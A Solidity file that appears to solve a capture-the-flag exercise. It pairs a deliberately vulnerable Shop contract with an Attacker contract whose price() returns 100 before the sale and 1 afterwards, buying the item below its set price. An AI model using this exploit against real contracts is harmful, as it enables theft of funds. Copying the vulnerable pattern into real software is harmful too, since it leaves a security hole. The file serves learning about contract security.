// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
    1. Inherit the interface Buyer in the contract Attacker 
    2. when the Shop contract calls the function price() and isSold is false, 
        return 100 to pass the first filter
    3. after isSold is set to true, return a lower price to set the price to 1.
*/

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Attacker is Buyer{

    Shop public shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function buy() public{
        shop.buy();
    }

    function price() external view returns (uint){
        if(!shop.isSold()){
            return 100;
        }else{
            return 1;
        }
    }

}